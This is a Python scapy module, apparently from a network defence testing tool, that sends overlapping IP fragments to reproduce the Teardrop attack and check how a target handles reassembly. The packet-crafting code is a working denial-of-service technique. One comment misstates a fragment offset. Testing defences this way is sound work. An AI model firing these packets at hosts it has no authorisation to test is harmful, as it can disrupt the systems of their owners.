from core.module_base import ModuleBase
from scapy.all import IP, ICMP, Raw, send
import time


class FragmentedPayloadGenerator(ModuleBase):
    """
    Simulated IP Fragmentation & Teardrop Offset Test Generator.
    Emits controlled fragmented IP packets with overlapping or standard offsets
    to validate defragmentation reassembly and Teardrop defense sentinels.
    """

    def __init__(self, session):
        super().__init__(session)
        self.options = {
            "TARGET": {"value": "127.0.0.1", "required": True, "desc": "Target destination IP"},
            "OVERLAP": {"value": "true", "required": True, "desc": "true (simulate Teardrop overlap) or false (standard fragments)"},
        }

    def run(self):
        target = self.options["TARGET"]["value"]
        overlap = self.options["OVERLAP"]["value"].lower().strip() in ("true", "1", "yes")

        print(f"[*] Emitting fragmented test packets to {target} (Overlap: {overlap})...")
        ip_id = 42424

        try:
            # Fragment 1: offset 0, 32 bytes, MF=1
            frag1 = IP(dst=target, id=ip_id, flags="MF", frag=0) / ICMP(type=8, code=0) / Raw(load=b"A" * 24)
            send(frag1, verbose=0)
            print("  [>] Transmitted Fragment #1 (Offset 0, Len 32, MF=1)")

            # Fragment 2: offset 3 (units of 8 bytes = 24 bytes).
            # If overlap=True, offset is set to 2 (16 bytes), creating an overlap with Fragment 1!
            frag2_offset = 2 if overlap else 4
            frag2 = IP(dst=target, id=ip_id, flags=0, frag=frag2_offset) / Raw(load=b"B" * 24)
            send(frag2, verbose=0)
            print(f"  [>] Transmitted Fragment #2 (Offset {frag2_offset * 8}, Overlap: {overlap})")

        except PermissionError:
            print("[-] Permission denied. Run ANDS with sudo.")
            return
        except KeyboardInterrupt:
            print("\n[*] Fragmentation test stopped.")
            return

        print(f"[+] Fragmented payload emission finished.")
